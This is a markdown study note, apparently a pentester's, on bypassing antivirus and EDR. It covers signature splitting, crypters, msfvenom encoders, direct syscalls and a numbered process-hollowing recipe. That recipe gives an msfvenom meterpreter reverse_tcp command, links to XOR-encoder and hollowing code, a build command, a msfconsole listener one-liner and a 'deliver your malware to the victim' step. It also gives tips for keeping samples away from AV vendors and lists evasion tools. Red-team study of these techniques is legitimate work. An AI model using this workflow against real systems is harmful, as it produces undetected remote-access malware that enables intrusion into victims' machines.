# AV Evasion techniques

## How an AV work
First it's important to note that that AV are mostly signature based, but there is other techniques too like heuristic analysis, rootkit detection, sandbox:

AV are just one type of protection, but there are many others:
- EDR / XDR
- Anti-virus
- AMSI (on windows)
- UAC (on windows)
- Firewalls


Intro resources:
- [How does AV software work](https://www.safetydetectives.com/blog/how-does-antivirus-software-work/)
- [How Does Antivirus Software Work And How To Evade It](https://www.youtube.com/watch?v=1_rXO2Es5B8)


### Signature based bypass (evasion on disk)
In this [Ippsec Video](https://www.youtube.com/watch?v=9pwMCHlNma4), He will first search through the binary by progressively cutting it and testing each fragment against win defender in a VM. If he identify an flagged fragment, he will first try to identify and replace flagged bytes with HxD (hexdump on windows) then when the payload was identified he will try to replace the corresponding string in the source code and rebuild the malware.
(Tools such as “Dsplit” and “Evade” can be used for file splitting)
Then at 1:13:23 by using "dumpbin" and "lib" tools from VisualStudio, he faked a new netapi32.min.lib by creating his own .def file and refer the function index instead of it's symbol name.
We switched from [name load to ordinal load](https://social.msdn.microsoft.com/Forums/vstudio/en-US/37017c03-c8e7-422c-85b2-cb0c4205e96d/dll-function-by-ordinal-vs-by-name?forum=windowssdk)


#### Obfuscation: Crypt / Encrypt your payload
Encrypting the binary is one of the common ways to bypass antivirus detection. The logic behind using encrypters is to obfuscate the binary from antivirus tools by encrypting it. This will be decrypted back when the binary is run. Kali Linux has got an open source encrypter named [Hyperion](https://www.kali.org/tools/hyperion/) available in it.

```bash 
msfvenom [...] --encrypt --encrypt-key <a random key>
```
A lot of AV can detect the crypter signature and considers that if the program is crypted it is obviously a malware, then the detection rate can increase instead of decrease !

#### Obfuscation: Encode your payload
```sh
msfvenom -l encoders # list encoders
```

The most notorious encoders are:
- shikata-ga-nai
- opt_sub

#### Other methods for evasion on disk
(or combine them together for more discretion)
 
- Protectors
- Payload staggers
- Packers (or packagers): It's used to bundle an executable with all it's dependencies in only one big file (also used to compress an executable). While this may be done for legitimate reasons – to save disk space or reduce data transmission time – packers are also used by cybercriminals as a form of code obfuscation.
- Create a 7zip password protected archive of the malware
- Sign your binaries : MSI and the executable are signed. Windows Defender aggressively quarantines unsigned binaries, so it is highly recommended that Velociraptor be signed.


### Heuristic analysis bypass

What is heuristic analysis ?
- https://en.wikipedia.org/wiki/Heuristic_analysis
- https://usa.kaspersky.com/resource-center/definitions/heuristic-analysis

#### Static heuristic:
Heuristic analysis can employ a number of different techniques. One heuristic method, known as static heuristic analysis, involves decompiling a suspect program and examining its source code. This code is then compared to viruses that are already known and are in the heuristic database. If a particular percentage of the source code matches anything in the heuristic database, the code is flagged as a possible threat.

#### Dynamic heuristic:
(Anomaly-based detection, behaviour analysis)

Another method is known as dynamic heuristics. When scientists want to analyze something suspicious without endangering people, they contain the substance in a controlled environment like a secure lab and conduct tests. The process is similar for heuristic analysis — but in a virtual world. (sandbox)

It isolates the suspicious program or piece of code inside a specialized virtual machine — or sandbox — and gives the antivirus program a chance to test the code and simulate what would happen if the suspicious file was allowed to run. It examines each command as it's activated and looks for any suspicious behaviors, such as self-replication, overwriting files, and other actions that are common to viruses.

##### Sandbox bypass
Using a sandbox before installing any new software. Think about this website you’re reading. It has a ton of visitors, so we wouldn’t want to push a new feature live without testing it first. Install an untested plugin, for instance, and you risk a bug bringing down the entire website.

Instead, you’d test any new features on a staging server, first. It’s like a working replica that allows you to make changes and analyze the impact before pushing it ‘live.’

Sandboxing is considered a behavioral-based detection scheme because it’s judging the behavior of the virus, as opposed to automatically classifying it based on its properties.

Last but not least, antivirus software is beginning to layer on machine learning to these behavior-based techniques. That way, they can predict what’s about to happen (based on previous similar actions) and stop it in its tracks before it does.

##### What is monitored during the sandbox phase?
- Application directly interacts with the host OS
- SysCalls are made
- Network connection are established
- Registry entries are modified
- Event log are written out
- Temporary files are created or deleted
- New processes are spawned
- Configuration files are updated


### Memory evasion
Some of AV evasion via memory:

- Direct syscalls
- Process hollowing
- Using shellscripts in CLI instead of dropping a file on the victim
- Inline Hooking
- Reflective DLL injection
  - see : [https://twitter.com/OtterHacker/status/1583386338828509184?s=20&t=m0P-DwljbIABWQVSl7JVFw](https://twitter.com/OtterHacker/status/1583386338828509184?s=20&t=m0P-DwljbIABWQVSl7JVFw "https://twitter.com/OtterHacker/status/1583386338828509184?s=20&t=m0P-DwljbIABWQVSl7JVFw")

#### Direct syscalls

SysCalls provided by windows API (dlls like kernel32.dll, etc...)
Are watched by EDR and AVs to checks the passed parameters
To avoid that we can make / create our own syscalls using [Dinvoke](https://github.com/TheWover/DInvoke) for C# and [Syswhispers](https://www.google.com/search?q=Syswhisper&oq=syswhisper&aqs=chrome.0.69i59j0i512l7j0i30l2.1465j0j4&sourceid=chrome&ie=UTF-8) for C++.
Take a look at [this video by processus thief](https://www.youtube.com/watch?v=n5r2jc2X6lc)



#### Process Hollowing

Explanatory video:
https://www.youtube.com/watch?v=CTkbSiOBi58

##### 1 - Generate a shellcode
You can get a lot of shell code at : https://shell-storm.org/shellcode/
Or use metasploit:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<port> EXITFUNC=thread -f csharp
```

##### 2 - Encode (XOR) your shellcode with this dotnet:
Use this C#.Net program:
https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/XOR%20Shellcode%20Encoder/Program.cs
(it's a good idea to change the `0xfa` key to another value).

Then run the program:
```bash
dotnet run
```
then copy the given encoded shellcode

##### 3 - Process Hollowing
Use this C#.Net program:
https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Shellcode%20Process%20Hollowing/Program.cs

Replace the byte array by your own encoded shellcode copied previously
If you had changed the encode key (`0xfa`) you have to put the same value here too.

Then build the malware:
```bash
dotnet publish -p:PublishSingleFile=true -r win-x64 -c Release --self-contained true -p:PublishTrimmed=true
```

##### 4 - Start a listener
```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 0.0.0.0; set lport <port>; exploit"
```

##### 5 - Deliver your malware to the victim and run it



### Test your malware
Do not drop your modified file into a [Virus Total](https://www.virustotal.com/gui/home/upload) type site as you'd be potentially alterting AV prior your engagement, but you should validate with local instance of AV to make sure they don't trigger any signature (remember to disable the "automatic sending of samples" on microsoft defender : “Windows Security” app from the Start Menu. Go to Virus & threat protection > Manage settings. Then, disable Automatic Sample Submission by its toggle)
Or you can use : https://antiscan.me/


### Post exploitation
- You can take a look at the "**Fully Undetectable Payload**" (FUD), for example
https://www.neushield.com/learn/fully-undetectable-fud/
- We can stop and disable the Anti-virus or create an exception (see [[Disable windows defender]])
- Use whitelisted / allowed softwares (like winrm, rdp, vnc, ssh) instead of your payload
- Use python instead ! because it is very often allowed and easily tamperable


## Conclusion
The easy way to go:
- To simplify your life it is sometimes possible to deactivate the antivirus before running the program
- Modify the source files as much as possible
- Manually encode the shellcode
- Implement your own malware

As said in this [video](https://www.youtube.com/watch?v=2H_1ZkZ83gI) (7:45min) all the tools like Veil, Shellter, Metasploit, Encoders, Crypters, etc... Are very easy to use and are automatic.
But due to this automation, the malwares generated are similar and their signatures have been spotted for a long time.
If you really want to bypass AVs, you have to tamper and recompile an existing malware, or code your own as [Ippsec](https://www.youtube.com/watch?v=9pwMCHlNma4) or [Processus Thief](https://www.youtube.com/watch?v=rAr7uhKi2_k)



## Other resources
[Hacktricks](https://book.hacktricks.xyz/windows-hardening/av-bypass)
[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Evasion.md)
[Antivirus evation tools](https://resources.infosecinstitute.com/topic/antivirus-evasion-tools/)
[Undetectable reverse shell](https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15)



#### Other videos:
recommended:
[Hafnium Créer un malware INDÉTECTABLE](https://www.youtube.com/watch?v=2H_1ZkZ83gI)
[Processus Thief - # Créer un malware INDETECTABLE](https://www.youtube.com/watch?v=CTkbSiOBi58)
[Processus Thief - J'AI ENCORE CRÉÉ UN MALWARE INDÉTECTABLE PAR LES ANTIVIRUS](https://www.youtube.com/watch?v=n5r2jc2X6lc)
[MALWARE COBALT STRIKE INDETECTABLE](https://www.youtube.com/watch?v=CHk2XzFKwNc)
others:
[ZSecurity : How Hackers Create Fully Undetectable Backdoors!](https://www.youtube.com/watch?v=cgM-_42rWbM)
[Processus Thief - JE CRÉE UN MALWARE INDÉTECTABLE PAR LES ANTIVIRUS](https://www.youtube.com/watch?v=rAr7uhKi2_k)
[Waked XY - Techniques et methodes de bypass d'antivirus](https://www.youtube.com/watch?v=qJOxqfjWGaM)
[Manual Payload Encoding with a XOR 19](https://www.youtube.com/watch?v=qtM0hpv5Vt4)
[Packt> Using Metasploit shikata_ga_nai and opt_sub](https://www.youtube.com/watch?v=tOUMbgTc91w)
[Null Byte - Create a C++ FUD with Madwin](https://null-byte.wonderhowto.com/forum/create-fud-c-backdoor-with-madwin-0193766/)



### Others Tools
- [Veil Framework](https://www.veil-framework.com/framework/veil-evasion/) : generate payloads that bypasses AVs
- [TheFatRat](https://github.com/screetsec/TheFatRat) : generate payloads that bypasses AVs
- [Shellter](https://www.shellterproject.com/download/) : dynamic shellcode injection tool
- [shikata-ga-nai](https://www.mandiant.com/resources/shikata-ga-nai-encoder-still-going-strong) : the main Metasploit encoder
- PeCloack : https://www.reddit.com/r/netsec/comments/2z7aom/pecloakpy_an_experiment_in_av_evasion/
- Dsplit or Evade : split your binary in multiple fragments
- [defeat-defender](https://secnhack.in/create-fud-fully-undetectable-payload-for-windows-10/)
- https://github.com/optiv/Freeze
- https://github.com/t3l3machus/Villain

### Other References:
- https://chryzsh.gitbooks.io/pentestbook/content/bypassing_antivirus.html
- https://www.ired.team/offensive-security/defense-evasion
##### Hide01:
- https://pwk.hide01.ir/index.html#video-path=media/video/AE_00_00.mp4&time-offset=2
- https://pen300.hide01.ir/index.html#video-path=media/video/AVINTRO_01_00.mp4&time-offset=5
##### Motasem Hamdan (youtube serie):
- [AntiVirus Evasion with Shellcodes P1 | TryHackMe AV Evasion](https://www.youtube.com/watch?v=UIEAYRkO8K4)
- [Signature and AntiVirus Evasion Techniques P2 | TryHackMe](https://www.youtube.com/watch?v=nHiduj8PJV4)
- [Signature Identification and Evasion Techniques | TryHackMe](https://www.youtube.com/watch?v=YMfqPOUQa1Y)
- [Sandbox Detection and Evasion Techniques | The Great Escape | TryHackMe](https://www.youtube.com/watch?v=8lwqrjXtGEw)
- [Obfuscation Techniques For AntiVirus Evasion | Part 2 | TryHackMe](https://www.youtube.com/watch?v=YMRWLGyIa-U)
- [Obfuscation Techniques For AntiVirus Evasion | Part 1 | Concatenation | TryHackMe](https://www.youtube.com/watch?v=oIrPwUSy_B8)

## More Reading
obfuscate revshell : https://medium.com/@vostiar.patrik/windows-11-reverse-shell-in-7steps-undetected-by-windows-defender-1c4e5e3e8d30
powershell reflexion
direct syscall
dll unhooking
